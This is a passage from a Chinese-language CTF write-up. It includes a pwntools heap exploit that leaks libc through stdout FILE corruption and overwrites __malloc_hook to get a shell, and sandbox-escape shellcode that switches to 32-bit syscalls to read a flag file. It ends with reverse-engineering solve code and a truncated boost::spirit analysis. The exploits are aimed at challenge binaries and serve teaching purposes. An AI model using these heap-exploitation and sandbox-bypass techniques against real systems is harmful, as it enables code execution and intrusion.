        p.send(content)
    def delete(idx):
        p.recvuntil(">> ")
        p.sendline(str(2))
        p.recvuntil("idx :")
        p.sendline(str(idx))
    def edit(idx,content):
        p.recvuntil(">> ")
        p.sendline(str(3))
        p.recvuntil("idx: ")
        p.sendline(str(idx))
        p.recvuntil("content:\n")
        p.send(content)
    create(0,0x60,"a")
    create(1,0x60,"b")
    create(2,0x60,"c")
    delete(0)
    delete(1)
    p.recvuntil(">> ")
    p.sendline("1"*0x1000)
    create(3,0x60,"\xdd\x25")
    create(4,0x60,"e")
    delete(2)
    delete(1)
    edit(1,"\x00")
    create(5,0x60,"f")
    create(6,0x60,"f")
    file_struct = p64(0xfbad1887)+p64(0)*3+"\x58"
    create(7,0x60,"\x00"*0x33+file_struct)
    libc_addr =  u64(p.recvuntil("\x00",drop=True)[1:].ljust(8,"\x00"))-a.symbols["_IO_2_1_stdout_"]-131
    print hex(libc_addr)
    delete(6)
    edit(6,p64(libc_addr+a.symbols["__malloc_hook"]-0x23))
    create(8,0x60,"t")
    create(9,0x60,"a"*0x13+p64(libc_addr+0xf1147))
    p.recvuntil(">> \n")
    p.sendline(str(1))
    p.recvuntil("weapon: ")
    p.sendline(str(0x60))
    p.recvuntil("index: ")
    p.sendline(str(6))
    p.interactive()
## A+B judge
先跟各位师傅说声对不起......其实这道题没出好，本意是想出道代码审计的题目的，结果原来的库的bug比预期的多......
下面是一个非预期解
    #include 
    int main()
    {
        system("cat flag");
    }
下面是一个预期解，基本思想是利用32位的syscall去绕过限制，去读取文件
    #include 
    #include 
    #include 
    #include  /* mmap() is defined in this header */
    #include 
    #include 
    unsigned char shellcode[]= \
    "\x6a\x01\xfe\x0c\x24\x68\x66\x6c\x61\x67\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x68\x00\x38\x12\x00\x59\x89\xc3\xba\x00\x01\x00\x00\x6a\x03\x58\xcd\x80\xbb\x01\x00\x00\x00\xb9\x00\x38\x12\x00\xba\x00\x01\x00\x00\x6a\x04\x58\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80";
    /*
    push   0x1
    dec    BYTE PTR [esp]
    push   0x67616c66
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    push   0x5
    pop    eax
    int    0x80
    push   0x123800
    pop    ecx
    mov    ebx,eax
    mov    edx,0x100
    push   0x3
    pop    eax
    int    0x80
    mov    ebx,0x1
    mov    ecx,0x123800
    mov    edx,0x100
    push   0x4
    pop    eax
    int    0x80
    mov    eax,0x1
    int    0x80
    */
    unsigned char bypass[] = \
    "\x48\x31\xe4\xbc\x00\x34\x12\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x00\x30\x12\x00\xcb";
    /*
    xor rsp,rsp
    mov esp,0x123400
    mov    DWORD PTR [esp+0x4],0x23
    mov    DWORD PTR [esp],0x123000
    retf
    */
    int main()
    {
        char* p1=mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        char* p2=mmap((void*)0x123000,0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        memcpy(p1,bypass,sizeof(bypass));
        memcpy(p2,shellcode,sizeof(shellcode));
        int (*ret)() = (int(*)())p1;
        ret();
        return 0;
    }
# re
## Re_Sign
#### exp
    int main()
    {
        int int32_41E3D0[] = { 8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31, 43, 36, 3, 21, 65, 65 };
        char str_41E499[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        char base64_C[49] = {0};
        for (int i = 0; i  源代码`Cplusplus.cpp`
>
> 附件`Cplusplus.exe`
>
> 编译`compile.txt`
#### 分析
    struct st {
        unsigned short num1;
        unsigned short num2;
        unsigned short num3;
    };
    st boostFn(const std::string& s) {
        using boost::spirit::qi::_1;
        using boost::spirit::qi::ushort_;
        using boost::spirit::qi::char_;
        using boost::phoenix::ref;
        struct st res;
        const char* first = s.data();
        const char* const end = first + s.size();
        bool success = boost::spirit::qi::parse(first, end,
            ushort_[ref(res.num1) = _1] >> char('@')
            >> ushort_[ref(res.num2) = _1] >> char('#')
            >> ushort_[ref(res.num3) = _1]
        );
        if (!success || first != end) {
            //throw std::logic_error("Parsing failed");
            _exit(0);
        }
        return res;
    }
这段代码是`boost::spirit`相关，输入形如`num1@num2#num3`，用`@ #`分割三个`unsigned short`数值
    void boostFunc(unsigned short& num) {
        //随机数check
        //预期的num是78
        if (num > 111) {
            _exit(0);
        }
        boost::mt19937 rng(num);
        rng.discard(num % 12);
        //拷贝构造，保留了所有状态